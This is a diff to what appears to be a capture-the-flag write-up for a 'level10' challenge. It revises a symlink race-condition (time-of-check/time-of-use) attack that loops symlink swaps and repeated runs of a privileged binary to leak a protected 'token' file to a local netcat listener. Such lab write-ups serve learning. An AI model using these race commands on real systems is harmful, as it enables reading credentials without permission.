@@ -49,26 +49,16 @@ First, I need to listen at port 6969:
 alias listen="nc -l 6969"
 ```
 
-Then I need to set a link to a file that can be read by the level10 user:
+Then I need to set a link to a file that can be read by the level10 user and set it back to the token:
 
 ```bash
-alias reset="touch /tmp/dummy ; ln -sf /tmp/dummy /tmp/link"
+alias race="touch /tmp/dummy; while true; do ln -sf /tmp/dummy /tmp/link && ln -sf token /tmp/link; done"
 ```
 
 I need to start the program 'level10' to send the value of 'token' to 127.0.0.1:
 
 ```bash
-alias send="./level10 /tmp/link 127.0.0.1"
+alias send="while true; do ./level10 /tmp/link 127.0.0.1; done"
 ```
 
-And I need to change the file that is linked by /tmp/link between the verification and the open:
-
-```bash
-alias race="ln -sf token /tmp/link"
-```
-
-The final command combines everything and executes parallel 'listen,' 'send,' and 'race':
-
-```bash
-listen & reset ; send & race
-```
+The final commands combines everything and executes parallel 'listen,' 'send,' and 'race' in two diferent terminal to easyly get the information.
